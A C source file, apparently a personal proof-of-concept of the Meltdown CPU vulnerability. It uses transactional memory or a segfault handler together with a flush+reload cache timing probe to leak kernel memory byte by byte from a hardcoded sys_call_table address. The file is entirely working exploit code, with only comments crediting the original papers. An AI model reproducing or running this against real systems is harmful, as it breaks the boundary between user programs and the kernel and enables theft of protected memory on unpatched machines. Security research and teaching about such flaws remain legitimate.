#include <stdio.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/types.h>

#include <unistd.h>

#include <immintrin.h>

#include <setjmp.h>
#include <signal.h>

#include <sys/syscall.h>

#define PAGE_SIZE 4096

// Undefine this to use setjmp/longjmp to avoid dying on the segfault. 
#define USE_TSX 1 


void meltdown_read();

// The location of the 'sys_call_table' symbol.
// (Changes per system per reboot, if KASLR is enabled.)
// Can be read from /proc/kallsyms if root.
uint8_t* kernel_ptr = 0xffffffff85e00220;
uint8_t* buf;

#ifndef USE_TSX
sigjmp_buf jb;

void handle_sigsegv() {
	siglongjmp(jb, 1);
}
#endif


int main(int argc, char** argv) {
	printf("Kernel pointer: %llx\n", kernel_ptr);

	// map a 256 page buffer
	buf = malloc(PAGE_SIZE*256);

#ifndef USE_TSX
	signal(SIGSEGV, handle_sigsegv);
#endif


	// warm it up~
	for (int i = 0; i < 256; i++) {
		buf[PAGE_SIZE*i] = 0;
	}

	// Read 8 bytes; enough to get the location of sys_read.
	for (int j = 0; j < 8; j++) {
		// One byte at a time.
		meltdown_read();
		kernel_ptr++;
	}

	free(buf);
}

// Code borrowed from the flush+reload paper.
static inline unsigned long probe(uint8_t* adrs) {
	volatile unsigned long time;
	asm __volatile__ (
			"mfence            \n"
			"lfence            \n"
			"rdtsc             \n"
			"lfence            \n"
			"movq %%rax, %%rsi \n"
			"movq (%1),  %%rax \n"
			"lfence            \n"
			"rdtsc             \n"
			"subq %%rsi, %%rax \n"
			"clflush 0(%1)     \n"
			"movq %%rax, %0    \n"
			: "=a" (time)
			: "c" (adrs)
			: "%rsi", "%rdx"
			);
	return time;
}

// Based on code from the Meltdown paper.
static inline void trigger_meltdown() {
		asm __volatile__ (
				"top:                              \n"
				"mov $0, %%rax                     \n"
				"movb 0(%[kernel_ptr]), %%al       \n"
				"shl $0xc, %%rax                   \n"
				"jz top                            \n"
				"movq 0(%%rax,%1), %%rbx\n"
				:
				: [kernel_ptr] "r" (kernel_ptr), [probebuf] "r" (buf)
				: "%rax", "%rbx");
}

// Use the meltdown vulnerability to read one byte at a time.
// Kinda messy but oh well ?.?
void meltdown_read() {
	// Only retry 10 times.
	for (int count = 0; count < 10; count++) {
		
		// Make sure none of our buffer is in the cache.
		for (int i = 0; i < 256; i++) {
			_mm_mfence();
			_mm_clflush(&buf[PAGE_SIZE*i]);
		}

#ifndef USE_TSX
		int jmpval = sigsetjmp(jb, 1);

		// Run the buggy code.
		if (jmpval == 0)
		{
			trigger_meltdown();
		}
#else

		int status = 0;
		if ((status = _xbegin()) == _XBEGIN_STARTED) {
			trigger_meltdown();
			_xend();
		}
		else {}
#endif

		// Check each buffer page to determine which is in the cache (i.e. what was accessed during speculative execution?)
		int smallest_val = 0xFFFF;
		int val = 0;
	    	for (int j = 0; j < 256; j++) {
			int probeval = probe(&buf[PAGE_SIZE*j]);
		    	if (probeval < smallest_val) {
				smallest_val = probeval;
			   	val = j;

		    	}
	    	}
		// This value found on my laptop; may not be "right" everywhere.
	    	if (smallest_val < 100) {
		    	printf("%x: %d\n", val, smallest_val); 
		    	return;
	    	}
	}
}
